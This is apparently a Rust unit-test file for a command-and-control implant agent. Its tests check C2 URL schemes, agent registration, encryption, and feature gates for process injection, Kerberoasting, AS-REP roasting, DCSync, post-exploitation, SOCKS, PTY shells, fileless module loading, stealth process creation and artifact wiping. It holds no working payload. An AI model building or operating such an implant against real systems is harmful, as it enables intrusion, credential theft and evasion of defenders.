// Unit tests for shipped capability gates (Stage0 must not enable inject).

use crate::config;
use crate::crypto::{decrypt, encrypt};
use crate::types::{CommandResult, SystemInfo};
use crate::utils;

#[test]
fn validate_server_url_accepts_bind_and_common_schemes() {
    assert!(config::validate_server_url("ws://127.0.0.1:8080/ws"));
    assert!(config::validate_server_url("wss://example.com/ws"));
    assert!(config::validate_server_url("tcp://10.0.0.1:4444"));
    assert!(config::validate_server_url("dns://c2.example"));
    assert!(config::validate_server_url("bind://0.0.0.0:9000"));
    assert!(!config::validate_server_url("http://evil"));
}

#[test]
fn agent_uuid_is_stable_and_well_formed() {
    let a = utils::get_agent_uuid();
    let b = utils::get_agent_uuid();
    assert_eq!(a, b);
    assert_eq!(a.len(), 36);
    assert_eq!(a.chars().filter(|&c| c == '-').count(), 4);
}

#[test]
fn register_and_response_messages_do_not_panic() {
    let info = SystemInfo::collect();
    let reg = info.to_register_message();
    assert!(!reg.payload.is_null());

    let result = CommandResult {
        stdout: "ok".into(),
        stderr: String::new(),
        path: None,
        req_id: Some("r1".into()),
    };
    let resp = result.to_response_message();
    assert!(!resp.payload.is_null());
    let json = serde_json::to_string(&resp).expect("response serializes");
    assert!(json.contains("ok") || json.contains("stdout"));
}

#[test]
fn encrypt_decrypt_roundtrip_uses_shipped_crypto() {
    let key = b"01234567890123456789012345678901";
    let plain = b"feature-gate-probe";
    let enc = encrypt(plain, key);
    assert!(enc.len() >= 12);
    let dec = decrypt(&enc, key).expect("decrypt ok");
    assert_eq!(&dec[..], plain);
}

#[test]
fn encrypt_rejects_wrong_key_length_without_panic() {
    let enc = encrypt(b"x", b"short");
    assert!(enc.is_empty());
}

#[test]
fn inject_not_in_product_minimal() {
    // Sole product tier is minimal; inject is L2-only (`inject-worker`).
    // (Skipped when tests run with `inject` unified in, e.g. `cargo test --workspace`
    // — same pattern as the bof gate below. Product builds still fail closed.)
    #[cfg(not(feature = "inject"))]
    assert!(
        !cfg!(feature = "inject"),
        "inject must not be compiled into Stage0 product agent (use L2 inject-worker)"
    );
}

#[test]
fn ad_commands_require_ad_module_not_stage0() {
    use crate::module_loader::{is_ad_command, module_for_command, MOD_AD, MOD_INJECT};
    // Design gate table samples
    for ct in [
        "ad_discover",
        "kerberoast",
        "asrep_roast",
        "dcsync",
        "ad_ping",
        "ad_enum_users",
        "ad_graph_collect",
    ] {
        assert!(is_ad_command(ct), "{ct} should be AD command");
        assert_eq!(
            module_for_command(ct),
            Some(MOD_AD),
            "{ct} must gate on ad"
        );
    }
    // Daily ops must not require ad
    assert_eq!(module_for_command("shell"), None);
    assert_eq!(module_for_command("file_list"), None);
    assert_eq!(module_for_command("process_list"), None);
    // inject not regressed
    assert_eq!(module_for_command("process_inject"), Some(MOD_INJECT));
    // Stage0 wipe is not worker-gated
    assert_eq!(module_for_command("ad_artifact_wipe"), None);
    assert!(!is_ad_command("ad_artifact_wipe"));
}

#[test]
fn ad_artifact_wipe_path_safety() {
    use crate::ad_artifact::{parse_wipe_path, wipe_ad_artifact};
    // Traversal must fail
    let err = wipe_ad_artifact("..\\cpx_ad_x.out").expect_err("traversal");
    assert!(
        err.contains("traversal") || err.contains("outside") || err.contains("access_denied"),
        "{err}"
    );
    // Wrong prefix under temp
    let bad = std::env::temp_dir().join("evil.txt");
    let err = wipe_ad_artifact(bad.to_str().unwrap()).expect_err("prefix");
    assert!(err.contains("cpx_ad_"), "{err}");
    // Happy path
    let p = std::env::temp_dir().join(format!("cpx_ad_gate_{}.out", std::process::id()));
    std::fs::write(&p, b"x").unwrap();
    wipe_ad_artifact(p.to_str().unwrap()).expect("wipe");
    assert!(!p.exists());
    assert!(parse_wipe_path(r#"{"path":"cpx_ad_z.out"}"#, None)
        .unwrap()
        .starts_with("cpx_ad_"));
}

#[test]
fn ensure_ad_missing_yields_module_required() {
    use crate::module_loader::ensure_module_for_command;
    let err = ensure_module_for_command("kerberoast").expect_err("no ad staged");
    assert!(
        err.contains("module_required:ad"),
        "got: {err}"
    );
    let err2 = ensure_module_for_command("ad_discover").expect_err("no ad staged");
    assert!(err2.contains("module_required:ad"), "got: {err2}");
}

#[test]
fn product_minimal_has_no_fat_or_in_process_runtime() {
    // Product = minimal only. No Stage0 BOF/.NET loaders, logging, multi-rt, plugin, stealth-adv.
    // (Skipped when tests are explicitly run with --features bof, i.e. L2 config testing.)
    #[cfg(not(feature = "bof"))]
    assert!(!cfg!(feature = "bof"), "bof not in product Stage0");
    assert!(!cfg!(feature = "dotnet"), "dotnet not in product Stage0");
    assert!(!cfg!(feature = "logging"), "logging not in product Stage0");
    assert!(
        !cfg!(feature = "rt-multi"),
        "rt-multi not in product Stage0"
    );
    assert!(!cfg!(feature = "plugin"), "plugin not in product Stage0");
    assert!(
        !cfg!(feature = "stealth-adv"),
        "stealth-adv not in product Stage0"
    );
}

#[test]
fn product_minimal_core_caps() {
    assert!(cfg!(feature = "socks"), "socks in minimal");
    assert!(cfg!(feature = "isolated-exec"), "isolated-exec in minimal");
    assert!(cfg!(feature = "module-loader"), "module-loader in minimal");
    assert!(cfg!(feature = "post-ex"), "post-ex in minimal");
    assert!(cfg!(feature = "pty"), "pty in minimal");
    // mem-map IS product now: fileless Manual-Map for L2 mod_bof (classic in-process
    // BOF engine). No iso_host, so mapped regions are limited to staged modules.
    assert!(
        cfg!(feature = "mem-map"),
        "mem-map required in product minimal for fileless mod_bof loading"
    );
}

#[test]
fn yamux_stream_type_constants_match_design_table() {
    use crate::transport::stream_types::*;
    assert_eq!(YAMUX_STREAM_PTY, 0x01);
    assert_eq!(YAMUX_STREAM_SOCKS, 0x02);
    assert_eq!(YAMUX_STREAM_FS, 0x03);
    assert_eq!(YAMUX_STREAM_PROCESS, 0x04);
    assert_eq!(YAMUX_STREAM_FILE, 0x0E);
    assert_eq!(YAMUX_STREAM_RESERVED, 0xFF);
}

#[test]
fn stealth_adv_cfg_is_explicit() {
    let _ = cfg!(feature = "stealth-adv");
}

#[test]
fn agent_uuid_stable_in_process() {
    use crate::utils::get_agent_uuid;
    let a = get_agent_uuid();
    let b = get_agent_uuid();
    assert_eq!(
        a, b,
        "UUID must be process-stable even if disk persist fails"
    );
    assert_eq!(a.len(), 36);
}

#[cfg(windows)]
#[test]
fn version_gate_logic_is_build_based() {
    use crate::stealth::{WindowsVersion, NT_CREATE_USER_PROCESS_MIN_BUILD};
    assert_eq!(NT_CREATE_USER_PROCESS_MIN_BUILD, 17763);
    assert!(!WindowsVersion::UNKNOWN.supports_nt_create_user_process());
    assert!(WindowsVersion {
        major: 10,
        minor: 0,
        build: 17763
    }
    .supports_nt_create_user_process());
    // Live OS probe must not panic
    let _ = crate::stealth::get_windows_version();
    let _ = crate::stealth::is_supported_for_nt_create_user_process();
}
